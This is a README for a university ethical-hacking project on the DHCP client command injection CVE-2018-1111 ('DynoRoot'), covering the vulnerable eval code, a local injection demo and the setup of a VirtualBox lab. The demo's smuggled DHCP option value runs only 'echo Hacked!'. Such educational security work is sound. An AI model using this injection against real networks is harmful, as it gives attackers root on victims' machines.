<h1 align="center" style="border-bottom: none;">DynoRoot CVE-2018-1111</h1>
<h4 align="center">Final project for the course <a href="https://www.kth.se/student/kurser/kurs/FEP3370?l=en">Advanced Ethical Hacking</a> at KTH, Stockholm</h4>

This project demonstrates a known vulnerability of Fedora and RedHat machines related to an unsafe
client-side implementation of the Dynamic Host Configuration Protocol (DHCP). A rogue DHCP server
can craft DHCP offers with a malicious payload that gets executed in a root shell on the victim
machine.

The vulnerability is credited to [Felix Wilhelm](https://twitter.com/_fel1x) and is known as
[CVE-2018-1111](https://access.redhat.com/security/vulnerabilities/3442151) or "DynoRoot".

<video style="position:relative; left:50%; transform:translateX(-50%); max-width:1000px;" width="90%" controls>
  <source src="./media/dynoroot.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

### Table of contents:
- [Introduction](#introduction)
  - [Background](#background)
  - [Vulnerability](#vulnerability)
  - [Sources](#sources)
- [Setup](#setup)
  - [Preliminaries](#preliminaries)
  - [Gateway machine](#gateway-machine)
  - [Attacker](#attacker)
  - [Fedora Victim](#fedora-victim)
- [Performing the attack](#performing-the-attack)
  - [Gateway](#gateway)
  - [Attacker](#attacker-1)
  - [Victim](#victim)
  - [Analysis](#analysis)
- [Future work](#future-work)
- [Credits](#credits)

## Introduction

### Background
The Dynamic Host Configuration Protocol (DHCP) is an often-overlooked component in networked
systems. Its role is to allow the dynamic configuration of hosts machines that connect to an
existing network. The most common use case is to assign an IP address to newly-connected hosts and
to inform it of existing routes to access other networks. Additional options can be specified, for
example the address of a local DNS server and the zone it serves, or the location of a boot file.

Let's analyze the 4-way protocol that is followed when a new host wants to join a network after connecting to it physically by means of an ethernet or wireless connection.
1. The client, lacking an IP address, broadcasts a `DISCOVER` message to the network.
2. A DHCP server in charge of that network replies with an `OFFER`, containing: IP address, network
   submask, router address, and other options.
3. The client replies with a `REQUEST`, officially requesting to _lease_ the IP address that was
   offered
4. The server concludes the exchange with an `ACK`, indicating that the client is allowed to use the
   IP address for a specified amount of time.

After the initial exchange, the client can renew the lease by simply sending another `REQUEST` message. The server will check the existence of a lease with the client's IP and MAC address and reply with an `ACK`.

<figure style="text-align:center">
  <img src="./media/dhcp_session.svg" style="max-width:200px;" width="90%"/>
  <figcaption>DHCP Session (figure from <a href="https://commons.wikimedia.org/wiki/File:DHCP_session.svg">Wikimedia Commons</a>, under <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.en">CC BY-SA 4.0</a> license).</figcaption>
</figure>


Some things to note:
- A client can also skip the `DISCOVER` phase and immediately `REQUEST` an address. This is common
  in scenarios in which the client already connected to the network in the past and remembers the
  previous address. In this case, the server verifies the availability of the address and `ACK`s the request, or, in case the lease is not available, sends a `NACK`.
- Upon disconnection, clients can send a `RELEASE` message to inform the server that the address is
  now available. However, this is not mandated by the protocol and the server will periodically
  recollect expired leases.
- Each DHCP server manages a limited pool of IP addresses, once they are all assigned, the server
  will not be able to `OFFER` leases to new clients
- Multiple DHCP servers can exist on the same network, if a client receives multiple `OFFER`s it
  will only accept one, the other servers will observe the broadcasted `REQUEST` and invalidate the
  offer.

### Vulnerability

The vulnerability is located in `/etc/NetworkManager/dispatcher.d/11-dhclient`, which is executed 
by the client to parse and set the options received over DHCP.
- `declare` is a bash builtin that when used without arguments lists all declared variables
- `grep` filters all DHCP-related variables
- `while read opt` iterated over the DHCP variables one by one, performs some parsing and 
  prints a line like `export new_optionname=value` for each option
- the export statements are then evaluated by the shell through `eval`
```bash
eval "$(
  declare | LC_ALL=C grep '^DHCP4_[A-Z_]*=' | while read opt; do
    optname=${opt%%=*}
    optname=${optname,,}
    optname=new_${optname#dhcp4_}
    optvalue=${opt#*=}
    echo "export $optname=$optvalue"
  done
)"
```

<!-- omit in toc -->
#### Regular operation
In normal situations, the code would work just fine and parse the new DHCP options.
As an example, the following code:
```bash
DHCP4_OPTION_ONE=42
DHCP4_OPTION_TWO="bla bla"

declare | LC_ALL=C grep '^DHCP4_[A-Z_]*=' | while read opt; do
  optname=${opt%%=*}
  optname=${optname,,}
  optname=new_${optname#dhcp4_}
  optvalue=${opt#*=}
  echo "export $optname=$optvalue"
done
```
Will print these two `export` statements to be evaluated by `eval`:
```bash
export new_option_one=42
export new_option_two='bla bla'
```

<!-- omit in toc -->
#### Code injection
However, due to the unsafe `eval`, it is possible to inject bash commands:
```bash
DHCP4_OPTION_ONE="x'& echo Hacked! #"
DHCP4_OPTION_TWO='bla bla'

eval "$(                             
  declare | LC_ALL=C grep '^DHCP4_[A-Z_]*=' | while read opt; do
    optname=${opt%%=*}
    optname=${optname,,}
    optname=new_${optname#dhcp4_}
    optvalue=${opt#*=}
    echo "export $optname=$optvalue"
  done
)"
```

Will result in the evaluation of `echo Hacked!`:
```text
[1] 1541
Hacked!
```

### Sources
- [Exploit database entry](https://www.exploit-db.com/exploits/44890)
- [RedHat announcement](https://access.redhat.com/security/vulnerabilities/3442151)
- [Tenable blog post](https://www.tenable.com/blog/advisory-red-hat-dhcp-client-command-injection-trouble)
- [GitHub repository](https://github.com/kkirsche/CVE-2018-1111)
- [Twitter announcement](https://twitter.com/_fel1x/status/996388421273882626?lang=en)

## Setup
The minimal setup to demonstrate the exploit consists of just two machines: the `victim` machine
running Fedora 28, and an `attacker` machine. In this setup, the attacker simply needs to offer a
DHCP service and wait the victim's connection.

<figure style="text-align:center">
  <img src="./media/network_simple.svg" style="max-width:400px;" width="90%"/>
  <figcaption>Minimal exploit setup.</figcaption>
</figure>

A more realistic setup would place the machines on a private network, where a third machine, the
`gateway`, is configured as the benign DHCP server and as the gateway to the outside internet.
In this setup, the attacker has to prevent the victim from connecting to the legit DHCP server
before hoping to perform the attack.

<figure style="text-align:center">
  <img src="./media/network.svg" style="max-width:800px;" width="90%"/>
  <figcaption>Private network setup with one gateway machine acting as DHCP, router and firewall.</figcaption>
</figure>

In the following sections we will:
1. Install VirtualBox
2. Create 3 virtual machines: `gateway`, `attacker`, and `victim`
3. Install the OS on the machines (users, network and SSH access)
4. Configure the gateway to host the benign DHCP server 
   for the virtual internal network supplied by VirtualBox
5. Install the Python dependencies for the attack

To [jump straight into action](#performing-the-attack) and skip the manual setup, it's possible to
run the [`setup.sh`](./ansible/setup.sh) script in the `ansible` folder, which will (almost)
automatically create the virtual machines and configure them using 
[Ansible Roles](https://docs.ansible.com/ansible/latest/user_guide/playbooks_reuse_roles.html).
Just make sure that Ansible and VirtualBox are installed before launching `setup.sh`.

### Preliminaries

#### Install VirtualBox
The following instructions are from the [official installation guide](https://www.virtualbox.org/wiki/Downloads).

Add this line to `/etc/apt/sources.list`:
```bash
deb [arch=amd64] 'https://download.virtualbox.org/virtualbox/debian' bionic contrib
```

Install virtualbox and the extension pack:
```bash
wget -q 'https://www.virtualbox.org/download/oracle_vbox_2016.asc' -O- | sudo apt-key add -
wget -q 'https://www.virtualbox.org/download/oracle_vbox.asc' -O- | sudo apt-key add -

sudo apt-get update
sudo apt-get -y install gcc make linux-headers-$(uname -r) dkms virtualbox-6.1

wget 'https://download.virtualbox.org/virtualbox/6.1.16/Oracle_VM_VirtualBox_Extension_Pack-6.1.16.vbox-extpack'
sudo VBoxManage extpack install Oracle_VM_VirtualBox_Extension_Pack-6.1.16.vbox-extpack
VBoxManage list extpacks
```

#### Install Ansible (optional)
From the [official guide for Ubuntu](https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html#installing-ansible-on-ubuntu):
```bash
sudo apt update
sudo apt install software-properties-common
sudo apt-add-repository --yes --update ppa:ansible/ansible
sudo apt install ansible
```

#### Common SSH setup
In this section we'll create the SSH credentials that we'll use to log in into the machines.
Adding the host entries in the SSH config file will save us some typing later.

Create an SSH key with no passphrase:
```bash
ssh-keygen -f ~/.ssh/ethhack -t ed25519 -N ''
```

Add these entries to the SSH config (`~/.ssh/config`):
```
Host gateway.ethhack
  Port 6001
  User gateway   

Host victim.ethhack
  Port 6002
  User victim

Host attacker.ethhack
  Port 6003
  User attacker

Host *.ethhack
  LogLevel ERROR
  HostName localhost
  IdentityFile ~/.ssh/ethhack
  StrictHostKeyChecking no
  UserKnownHostsFile /dev/null
```

### Gateway machine
This machine hosts the benign DHCP server that manages a pool of addresses on the internal network.
It is based on [Ubuntu Server 18.04](https://releases.ubuntu.com/18.04/) with the 
[ISC DHCP](https://www.isc.org/dhcp/) package.

In a real scenario, this machine would also act as a router ([iptables](https://www.netfilter.org/))
and firewall ([UFW Uncomplicated Firewall](https://launchpad.net/ufw)) between the machines on the
network and the outside world. Possibly, it would also host a DNS server for some internal services
([BIND9](https://www.isc.org/bind/)).

#### VM Creation
We will create the virtual machine using the command-line tools of VirtualBox, so that the process
can be repeated as quickly as possible. Otherwise, it's possible to create the VM through the
graphical interface by entering the same configuration.

Download the Ubuntu ISO:
```bash
wget 'https://ftp.lysator.liu.se/ubuntu-releases/18.04.5/ubuntu-18.04.5-live-server-amd64.iso'
md5sum --check << EOF
fcd77cd8aa585da4061655045f3f0511  ubuntu-18.04.5-live-server-amd64.iso
EOF
```

Create the VM:
- Network interface 1 connected to the default NAT network of VirtualBox
- Network interface 2 with connected to the `intnet` internal network\
  (the "d" in the MAC address stands for DHCP)
- Port forwarding from a `600x` port on the host to the SSH port in the virtual machine

```bash
VM_NAME="gateway"
VRDE_PORT=5001
SSH_PORT=6001
VM_MAC='08:00:dd:dd:dd:dd'

VBoxManage createvm --name "${VM_NAME}" --ostype Ubuntu_64 --register
VBoxManage modifyvm "${VM_NAME}" \
  --memory 2048 \
  --acpi on \
  --boot1 dvd \
  --nic1 nat \
  --nic2 'intnet' \
  --macaddress2 "${VM_MAC//:/}" \
  --natpf1 "guestssh,tcp,,${SSH_PORT},,22" \
  --audio none

VBoxManage createhd disk --filename "${VM_NAME}.vdi" --size 10000
VBoxManage storagectl "${VM_NAME}" --name "IDE Controller" --add ide --controller PIIX4
VBoxManage storageattach "${VM_NAME}" \
  --storagectl "IDE Controller" \
  --port 0 \
  --device 0 \
  --type hdd \
  --medium "${VM_NAME}.vdi"

VBoxManage storageattach "${VM_NAME}" \
  --storagectl "IDE Controller" \
  --port 0 \
  --device 1 \
  --type dvddrive \
  --medium "$(realpath ubuntu-18.04.5-live-server-amd64.iso)"
```

If something goes wrong:
```bash
VBoxManage unregistervm "${VM_NAME}" --delete
```

#### OS Install
The first time we boot the machine we need a virtual desktop to follow the installation steps. We
can start the virtual machine in headless more and use `rdesktop-vrdp` to connect. If VirtualBox is
running on a desktop computer it might be easier to launch the virtual machine from the GUI, but
this method will work even with a remote VirtualBox host.
```bash
VBoxHeadless --startvm "${VM_NAME}" --vrde on --vrdeproperty "TCP/Ports=${VRDE_PORT}" &
sleep 5
rdesktop-vrdp "localhost:${VRDE_PORT}"
kill %%
```

Configuration parameters for the installer:
- Hostname `gateway`
- User `gateway`
- Password `gat`
- Static IP `192.168.0.1` on `enp0s8`
- Enable SSH server

<figure style="text-align:center">
  <img src="./media/gateway_network.png" style="max-width:600px;" width="90%"/>/>
  <figcaption>Installation screenshot: network configuration.</figcaption>
</figure>
<figure style="text-align:center">
  <img src="./media/gateway_user.png" style="max-width:600px;" width="90%"/>
  <figcaption>Installation screenshot: user creation.</figcaption>
</figure>

After installation, shutdown, remove the iso and disable VRDE:
```bash
VBoxManage storageattach "${VM_NAME}" \
  --storagectl "IDE Controller" \
  --port 0 \
  --device 1 \
  --type dvddrive \
  --medium "none"
VBoxManage modifyvm "${VM_NAME}" --vrde off
```

#### SSH Login
For ease of access we can install the SSH key created above into the `gateway` machine:
```bash
VBoxHeadless --startvm "${VM_NAME}" &
sleep 5
ssh-copy-id -i ~/.ssh/ethhack.pub gateway.ethhack
ssh gateway.ethhack
```

<!-- Hostname
#### Networking
```bash
sudo sed 's/dns/dns dns.100waystocook.pizza/' -i /etc/hosts
sudo hostnamectl set-hostname 'dns.100waystocook.pizza'
```
-->

If for some reason the `enp0s8` network interface was not configured during the installation, 
write this config to `/etc/netplan/00-installer-config.yaml`:
```yaml
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: yes
    enp0s8:
      dhcp4: no
      addresses :
        - 192.168.0.1/24
```

And update the network configuration:
```
sudo netplan apply
ip addr show dev enp0s8
```

<!-- 
```
echo '
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: yes
    enp0s8:
      dhcp4: no
      addresses :
        - 192.168.0.1/24
      nameservers:
        search: [100waystocook.pizza]
        addresses: [192.168.0.1]
' | sudo tee /etc/netplan/00-installer-config.yaml > /dev/null
sudo netplan apply
ip addr show dev enp0s8
``` 
-->

#### DHCP server
Install ISC DHCP:
```bash
sudo apt install -y isc-dhcp-server
```

To enable DHCP on the internal interface, let's edit `/etc/default/isc-dhcp-server`:
```bash
sudo sed 's/INTERFACESv4=""/INTERFACESv4="enp0s8"/' -i /etc/default/isc-dhcp-server
```

The configuration of the address pool managed by the DHCP goes to `/etc/dhcp/dhcpd.conf`:
```
authoritative;

default-lease-time 60;
max-lease-time 7200;

subnet 192.168.0.0 netmask 255.255.255.0 {
  range 192.168.0.100 192.168.0.105;
}
```

The chose default lease time of 1 minute is rather low, but it useful for demonstration purpose.

<!-- 
```bash
echo '
authoritative;

default-lease-time 60;
max-lease-time 7200;

subnet 192.168.0.0 netmask 255.255.255.0 {
  range 192.168.0.100 192.168.0.105;
  option domain-name-servers 192.168.0.53;
  option domain-name "100waystocook.pizza.";
}
' | sudo tee /etc/dhcp/dhcpd.conf > /dev/null

sudo sed 's/INTERFACESv4=""/INTERFACESv4="enp0s8"/' -i /etc/default/isc-dhcp-server

sudo systemctl restart isc-dhcp-server
```
-->

Restart service:
```bash
sudo systemctl restart isc-dhcp-server
```

DHCP events are logged to `/var/log/syslog`. 
We can highlight relevant entries with:
```bash
tail -f /var/log/syslog | grep --line-buffered 'dhcpd' | grep -E 'dhcpd|attacker|fedora|'
```

If we leave the `gateway` on during the installation of the other machines, 
they'll pick up the DHCP configuration automatically.

<!-- 
#### DNS server
- [DNS Zone File Time Value Recommendations](https://securityblog.switch.ch/2014/02/06/zone-file-recommendations)
- [Bind9 Docs on zone files](https://bind9.readthedocs.io/en/v9_16_5/reference.html#zone-file)

Install bind:
```bash
sudo apt-get install -y bind9 bind9utils bind9-doc
sudo sed 's/OPTIONS="-u bind"/OPTIONS="-u bind -4"/' -i /etc/default/bind9
sudo systemctl restart bind9
```

Edit `/etc/bind/named.conf.options`:
```bash
echo '
options {
  directory "/var/cache/bind";
  allow-query { any; };
  recursion no;
  listen-on { 192.168.0.53; };
};
' | sudo tee /etc/bind/named.conf.options > /dev/null
```

Edit `/etc/bind/named.conf.local`:
```bash
echo '
# Forward zone for 100waystocook.pizza
zone "100waystocook.pizza" {
  type master;
  file "/etc/bind/zones/db.100waystocook.pizza";
};

# Reverse zone for 192.168.0.0/24
zone "0.168.192.in-addr.arpa" {
  type master;
  file "/etc/bind/zones/db.192.168.0";
};
' | sudo tee /etc/bind/named.conf.local > /dev/null 
```

Create a forward and backward zone files in a folder that is read-only for bind:
```bash
sudo install -o root -g bind -m 755 -d /etc/bind/zones

echo '
$TTL    86400 ; Clients will cache DNS responses for 1 day

@       IN      SOA     dns.100waystocook.pizza. admin.100waystocook.pizza. (
                  3     ; Serial
             604800     ; Refresh (1 week)
              86400     ; Retry   (1 day)
            2419200     ; Expire  (4 weeks)
             604800     ; Negative Cache TTL (4 weeks)
)                       ; The values above are only relevant for secondary DNS servers

; name servers
@       IN      NS      dns.100waystocook.pizza.

; 192.168.0.0/24
dns     IN      A       192.168.0.53
server  IN      A       192.168.0.1
www     IN      CNAME   server
mongo   IN      CNAME   server
' | sudo tee /etc/bind/zones/db.100waystocook.pizza > /dev/null

echo '
$TTL    604800
@       IN      SOA     dns.100waystocook.pizza. admin.100waystocook.pizza. (
                  4     ; Serial
             604800     ; Refresh
              86400     ; Retry
            2419200     ; Expire
             604800 )   ; Negative Cache TTL

; name servers
@     IN      NS      dns.100waystocook.pizza.

; PTR Records
1     IN      PTR     server.100waystocook.pizza.  ; 192.168.0.1
53    IN      PTR     dns.100waystocook.pizza.     ; 192.168.0.53
' | sudo tee /etc/bind/zones/db.192.168.0 > /dev/null
```

Run checks and restart:
```bash
sudo named-checkconf
sudo named-checkzone 100waystocook.pizza    /etc/bind/zones/db.100waystocook.pizza
sudo named-checkzone 0.168.192.in-addr.arpa /etc/bind/zones/db.192.168.0

sudo systemctl restart bind9
```

Check that it works
```bash
dig www.100waystocook.pizza
nslookup www.100waystocook.pizza
systemd-resolve www.100waystocook.pizza
```

#### Set DHCP server to automatically update DNS entries
- https://wiki.debian.org/DDNS
- http://www.btteknik.net/?p=143
- https://dev.to/skorotkiewicz/create-ddns-on-your-current-bind9-server-1d09
- https://blog.kroko.ro/2009/03/29/running-a-secure-ddns-service-with-bind/
- https://bind9.readthedocs.io/en/v9_16_5/reference.html#dynamic-update-policies
- https://www.techrepublic.com/blog/linux-and-open-source/setting-up-a-dynamic-dns-service-part-2-dhcpd/

##### Bind config
Create symmetric key for DNS updates:
```bash
KEY_NAME='ddns-key.100waystocook.pizza'
KEY_FILE_BIND="${KEY_NAME}.key"

KEY_FILE="$(dnssec-keygen -a HMAC-SHA512 -b 512 -r /dev/urandom -n USER "${KEY_NAME}")"
KEY_FILE_KEY="${KEY_FILE}.key"
KEY_FILE_PRI="${KEY_FILE}.private"
unset KEY_FILE

KEY_SECRET="$(cut -f7- -d ' ' "${KEY_FILE_KEY}")"

cat > "${KEY_FILE_BIND}" << EOF
key "${KEY_NAME}" {
  algorithm HMAC-SHA512;
  secret "${KEY_SECRET}";
};
EOF

sudo install --owner root --group bind --mode 0640 "${KEY_FILE_BIND}" /etc/bind/
rm "${KEY_FILE_BIND}"
```

Include the key in `/etc/bind/named.conf.local`:
```bash
echo "
include '/etc/bind/${KEY_FILE_BIND}';

# Forward zone for 100waystocook.pizza
zone '100waystocook.pizza' {
  type master;
  file '/var/lib/bind/zones-dyn/db.100waystocook.pizza';
  notify no;

  # grant whoever owns the key the permission to update 
  # the A and TXT records for server.100waystocook.pizza.
  update-policy {
    grant ${KEY_NAME} name server.100waystocook.pizza. A TXT;
  };
};

# Reverse zone for 192.168.0.0/24
zone '0.168.192.in-addr.arpa' {
  type master;
  file '/var/lib/bind/zones-dyn/db.192.168.0';
  notify no;

  # grant whoever owns the key the permission to update 
  # the PTR record for IPs in within the reverse zone
  update-policy {
    grant ${KEY_NAME} zonesub PTR;
  };
};
" | tr \' \" | sudo tee /etc/bind/named.conf.local > /dev/null 
```

Copy the original zone file to folder that is writable by bind, remove the `server` record:
```bash
sudo install -o root -g bind -m 775 -d /var/lib/bind/zones-dyn

sudo install -o root -g bind -m 664 /etc/bind/zones/db.100waystocook.pizza /var/lib/bind/zones-dyn
sudo sed '/^server/d' -i /var/lib/bind/zones-dyn/db.100waystocook.pizza

sudo install -o root -g bind -m 664 /etc/bind/zones/db.192.168.0 /var/lib/bind/zones-dyn
sudo sed '/server.100waystocook.pizza/d' -i /var/lib/bind/zones-dyn/db.192.168.0
```

Run checks and restart:
```bash
sudo named-checkconf
sudo named-checkzone 100waystocook.pizza    /var/lib/bind/zones-dyn/db.100waystocook.pizza
sudo named-checkzone 0.168.192.in-addr.arpa /var/lib/bind/zones-dyn/db.192.168.0

sudo systemctl restart bind9
```

##### Manual checks
Check that it works by manually updating the DNS entry.
While doing the following, keep an eye on `tail -f /var/log/syslog` for errors.
At the end, delete the new entries otherwise DHCP updates will fail:
```bash
TTL=60
NEW_NAME='server'
NEW_IP='99'

systemd-resolve "${NEW_NAME}.100waystocook.pizza"

nsupdate -d -k "${KEY_FILE_PRI}" << EOF
server dns.100waystocook.pizza.

zone 100waystocook.pizza.
update add ${NEW_NAME}.100waystocook.pizza. ${TTL} IN A 192.168.0.${NEW_IP}

zone 0.168.192.in-addr.arpa
update add ${NEW_IP}.0.168.192.in-addr.arpa ${TTL} IN PTR ${NEW_NAME}.100waystocook.pizza.

send
EOF

sudo systemd-resolve --flush-caches
systemd-resolve "${NEW_NAME}.100waystocook.pizza"
dig +short -x "192.168.0.${NEW_IP}"

nsupdate -d -k "${KEY_FILE_PRI}" << EOF
server dns.100waystocook.pizza.

zone 100waystocook.pizza.
update delete ${NEW_NAME}.100waystocook.pizza. IN A

zone 0.168.192.in-addr.arpa
update delete ${NEW_IP}.0.168.192.in-addr.arpa IN PTR

send
EOF
```

##### DHCP config
Configure DHCP to automatically update DNS entries:
```bash
KEY_FILE_DHCP="${KEY_NAME}.key"

# Note: no " in key file
cat > "${KEY_FILE_DHCP}" << EOF
key ${KEY_NAME} {
  algorithm HMAC-SHA512;
  secret ${KEY_SECRET};
};
EOF

sudo install --owner root --group root --mode 0640 "${KEY_FILE_DHCP}" /etc/dhcp/ddns-keys/
rm "${KEY_FILE_DHCP}"

echo "
authoritative;

# https://kb.isc.org/docs/isc-dhcp-44-manual-pages-dhcpdconf
ddns-updates on;
ddns-update-style interim;
ddns-domainname '100waystocook.pizza.';
ddns-rev-domainname '0.168.192.in-addr.arpa.';
update-conflict-detection on;
ddns-guard-id-must-match;
ignore client-updates;

default-lease-time 120;
max-lease-time 7200;

include '/etc/dhcp/ddns-keys/${KEY_FILE_DHCP}';

zone 100waystocook.pizza. {
  primary dns.100waystocook.pizza. ;
  key ${KEY_NAME} ;
}

zone 0.168.192.in-addr.arpa. {
  primary dns.100waystocook.pizza. ;
  key ${KEY_NAME} ;
}

subnet 192.168.0.0 netmask 255.255.255.0 {
  range 192.168.0.1 192.168.0.20;
  option domain-name-servers 192.168.0.53;
  option domain-name '100waystocook.pizza.';
}
" | tr \' \" | sudo tee /etc/dhcp/dhcpd.conf > /dev/null

sudo systemctl restart isc-dhcp-server
```

DHCP configuration can be checked with `sudo dhcpd -t`.

##### Result
When a machine with hostname `server` is started, `/var/log/syslog` should look like this:
```
# DHCP handshake
dhcpd[1366]: DHCPDISCOVER from 08:00:27:ca:ff:df via enp0s8
dhcpd[1366]: DHCPOFFER on 192.168.0.3 to 08:00:27:ca:ff:df (server) via enp0s8
dhcpd[1366]: DHCPREQUEST for 192.168.0.3 (192.168.0.53) from 08:00:27:ca:ff:df (server) via enp0s8
dhcpd[1366]: DHCPACK on 192.168.0.3 to 08:00:27:ca:ff:df (server) via enp0s8

# DNS update
named[1283]: client @0x7fef30041e40 192.168.0.53#53293/key ddns-key.100waystocook.pizza: 
             updating zone '100waystocook.pizza/IN': 
             adding an RR at 'server.100waystocook.pizza' A 192.168.0.3
named[1283]: client @0x7fef30041e40 192.168.0.53#53293/key ddns-key.100waystocook.pizza: 
             updating zone '100waystocook.pizza/IN': 
             adding an RR at 'server.100waystocook.pizza' TXT "31c8ab6283bcc3f723245ceab58eb496f0"
dhcpd[1366]: Added new forward map from server.100waystocook.pizza. to 192.168.0.3
named[1283]: client @0x7fef30057320 192.168.0.53#36001/key ddns-key.100waystocook.pizza: 
             updating zone '0.168.192.in-addr.arpa/IN': 
             deleting rrset at '3.0.168.192.0.168.192.in-addr.arpa' PTR
named[1283]: client @0x7fef30057320 192.168.0.53#36001/key ddns-key.100waystocook.pizza: 
             updating zone '0.168.192.in-addr.arpa/IN': 
             adding an RR at '3.0.168.192.0.168.192.in-addr.arpa' PTR server.100waystocook.pizza.
dhcpd[1366]: Added reverse map from 3.0.168.192.0.168.192.in-addr.arpa. to server.100waystocook.pizza.

# DHCP renewal
dhcpd[1366]: DHCPREQUEST for 192.168.0.3 from 08:00:27:ca:ff:df (server) via enp0s8
dhcpd[1366]: DHCPACK on 192.168.0.3 to 08:00:27:ca:ff:df (server) via enp0s8
```

When another machine with `fedora` as hostname is started, it gets and IP but it's not added to 
the DNS because of the `update-policy`:
```
dhcpd[1366]: DHCPDISCOVER from 08:00:27:4e:d0:d2 via enp0s8
dhcpd[1366]: DHCPOFFER on 192.168.0.6 to 08:00:27:4e:d0:d2 (fedora) via enp0s8
dhcpd[1366]: DHCPREQUEST for 192.168.0.6 (192.168.0.53) from 08:00:27:4e:d0:d2 (fedora) via enp0s8
dhcpd[1366]: DHCPACK on 192.168.0.6 to 08:00:27:4e:d0:d2 (fedora) via enp0s8
named[1283]: client @0x7fef30041e40 192.168.0.53#42609/key ddns-key.100waystocook.pizza: 
             updating zone '100waystocook.pizza/IN': 
             update failed: rejected by secure update (REFUSED)
dhcpd[1366]: Unable to add forward map from fedora.100waystocook.pizza. to 192.168.0.6: REFUSED
```

The problem is that DHCP will register **any** machine with hostname `server` to the DNS, 
as long as it's the first one. If an attacker tries to connect via DHCP with a duplicate `server` 
hostname, DHCP will notice and refuse to update the DNS. 
```
# DHCP handshake with attacker
dhcpd[1366]: DHCPDISCOVER from 08:00:27:4e:d0:d2 via enp0s8
dhcpd[1366]: DHCPOFFER on 192.168.0.2 to 08:00:27:4e:d0:d2 (server) via enp0s8
dhcpd[1366]: DHCPREQUEST for 192.168.0.2 (192.168.0.53) from 08:00:27:4e:d0:d2 (server) via enp0s8
dhcpd[1366]: DHCPACK on 192.168.0.2 to 08:00:27:4e:d0:d2 (server) via enp0s8

# DNS update denied
named[1283]: client @0x7fef30041e40 192.168.0.53#34663/key ddns-key.100waystocook.pizza: 
             updating zone '100waystocook.pizza/IN': update unsuccessful: 
             server.100waystocook.pizza: 'name not in use' prerequisite not satisfied (YXDOMAIN)
named[1283]: client @0x7fef30057320 192.168.0.53#39143/key ddns-key.100waystocook.pizza: 
             updating zone '100waystocook.pizza/IN': update unsuccessful: 
             server.100waystocook.pizza/TXT: 'RRset exists (value dependent)' prerequisite not satisfied (NXRRSET)
dhcpd[1366]: Forward map from server.100waystocook.pizza. to 192.168.0.2 FAILED: Has an address record but no DHCID, not mine.
```

But if the legit `server` goes down for some time, its lease is released and the records removed.
Then an attacker can simply sneak in by providing `server` as the hostname during the initial DHCP
exchange.
```
# DHCP removes DNS records
named[1283]: client @0x7fef30041e40 192.168.0.53#43939/key ddns-key.100waystocook.pizza: 
             updating zone '100waystocook.pizza/IN': deleting an RR at server.100waystocook.pizza A
dhcpd[1366]: Removed forward map from server.100waystocook.pizza. to 192.168.0.3
named[1283]: client @0x7fef30057320 192.168.0.53#46231/key ddns-key.100waystocook.pizza: 
             updating zone '100waystocook.pizza/IN': deleting an RR at server.100waystocook.pizza TXT
named[1283]: client @0x7fef30041e40 192.168.0.53#54069/key ddns-key.100waystocook.pizza: 
             updating zone '0.168.192.in-addr.arpa/IN': deleting rrset at '3.0.168.192.0.168.192.in-addr.arpa' PTR
dhcpd[1366]: Removed reverse map on 3.0.168.192.0.168.192.in-addr.arpa.

# Attacker gets and IP and a DNS entry
dhcpd[1366]: DHCPDISCOVER from 08:00:27:4e:d0:d2 via enp0s8
dhcpd[1366]: DHCPOFFER on 192.168.0.2 to 08:00:27:4e:d0:d2 (server) via enp0s8
dhcpd[1366]: DHCPREQUEST for 192.168.0.2 (192.168.0.53) from 08:00:27:4e:d0:d2 (server) via enp0s8
dhcpd[1366]: DHCPACK on 192.168.0.2 to 08:00:27:4e:d0:d2 (server) via enp0s8
named[1283]: client @0x7fef30057320 192.168.0.53#56317/key ddns-key.100waystocook.pizza: 
             updating zone '100waystocook.pizza/IN': 
             adding an RR at 'server.100waystocook.pizza' A 192.168.0.2
named[1283]: client @0x7fef30057320 192.168.0.53#56317/key ddns-key.100waystocook.pizza: 
             updating zone '100waystocook.pizza/IN': 
             adding an RR at 'server.100waystocook.pizza' TXT "319dc6047844ea45fdc56373d08413401e"
dhcpd[1366]: Added new forward map from server.100waystocook.pizza. to 192.168.0.2
named[1283]: client @0x7fef30041e40 192.168.0.53#51689/key ddns-key.100waystocook.pizza: 
             updating zone '0.168.192.in-addr.arpa/IN': 
             deleting rrset at '2.0.168.192.0.168.192.in-addr.arpa' PTR
named[1283]: client @0x7fef30041e40 192.168.0.53#51689/key ddns-key.100waystocook.pizza: 
             updating zone '0.168.192.in-addr.arpa/IN': 
             adding an RR at '2.0.168.192.0.168.192.in-addr.arpa' PTR server.100waystocook.pizza.
dhcpd[1366]: Added reverse map from 2.0.168.192.0.168.192.in-addr.arpa. to server.100waystocook.pizza.
```
-->

<!-- 
## Web Server

#### VM Creation
```bash
wget 'https://ftp.lysator.liu.se/ubuntu-releases/18.04.5/ubuntu-18.04.5-live-server-amd64.iso'

VM_NAME="webserver"
VRDE_PORT=5050
SSH_PORT=6050

VBoxManage createvm --name "${VM_NAME}" --ostype Ubuntu_64 --register
VBoxManage modifyvm "${VM_NAME}" \
  --memory 2048 \
  --acpi on \
  --boot1 dvd \
  --nic1 nat \
  --nic2 'intnet' \
  --natpf1 "guestssh,tcp,,${SSH_PORT},,22" \
  --vrde on \
  --vrdeport "${VRDE_PORT}" \
  --audio none

VBoxManage createhd disk --filename "${VM_NAME}.vdi" --size 10000
VBoxManage storagectl "${VM_NAME}" --name "IDE Controller" --add ide --controller PIIX4
VBoxManage storageattach "${VM_NAME}" \
  --storagectl "IDE Controller" \
  --port 0 \
  --device 0 \
  --type hdd \
  --medium "${VM_NAME}.vdi"

VBoxManage storageattach "${VM_NAME}" \
  --storagectl "IDE Controller" \
  --port 0 \
  --device 1 \
  --type dvddrive \
  --medium "$(realpath ubuntu-18.04.5-live-server-amd64.iso)"

VBoxHeadless --startvm "${VM_NAME}" --vrde on
```

#### OS Install
The first time we boot the machine we need a virtual desktop to follow the installation steps. We
can start the virtual machine in headless more and use `rdesktop-vrdp` to connect. If VirtualBox is
running on a desktop computer it might be easier to launch the virtual machine from the GUI, but
this method will work even with a remote VirtualBox host.
```
rdesktop-vrdp localhost:5050
```

Install config:
- user `webserver`
- pwd `web`
- hostname `server`
- enable ssh

After installation, shutdown, remove the iso and disable VRDE:
```bash
VBoxManage storageattach "${VM_NAME}" \
  --storagectl "IDE Controller" \
  --port 0 \
  --device 1 \
  --type dvddrive \
  --medium "none"
